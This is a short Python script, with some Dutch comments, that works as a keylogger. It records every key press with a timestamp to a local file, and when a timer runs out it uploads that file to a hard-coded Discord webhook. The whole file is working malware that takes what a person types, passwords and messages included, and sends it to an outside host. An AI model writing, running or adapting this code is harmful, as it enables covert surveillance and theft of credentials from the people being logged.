import keyboard, time, requests
from datetime import datetime, timedelta

def log_keystroke(event):
    key = event.name
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {key}", file=open("keylog.txt", "a"))

# Stel de logging duur in minuten (standaard 15 minuten)
logging_duration = 0.2  # Minuten

print(f"Keylogger actief voor {logging_duration} minuten...")
keyboard.on_press(log_keystroke)

start_time = datetime.now()
end_time = start_time + timedelta(minutes=logging_duration)

try:
    while datetime.now() < end_time:
        time.sleep(1)
except:
    pass
finally:
    # Replace with your Discord webhook URL
    webhook_url = "https://discord.com/api/webhooks/1312490607243169893/rAXjxjmPB48pdRmGCI9KsfU35mACoItBrmYfdgU60CruwRb1-33GTOQTtHJVlTDGnkQA"

    # Path to the file you want to send
    file_path = "keylog.txt"  # Replace with the path to your file

    # Prepare the file and payload
    files = {
        'file': open(file_path, 'rb')  # Open the file in binary mode
    }
    payload = {
        'content': "Here is the file you requested!"  # Message accompanying the file
    }

    # Send POST request to the webhook URL
    response = requests.post(webhook_url, data=payload, files=files)

    # Check if the request was successful
    if response.status_code == 200:
        print("File sent successfully!")
    else:
        print(f"Failed to send file. HTTP Status Code: {response.status_code}")

    files['file'].close()

keyboard.unhook_all()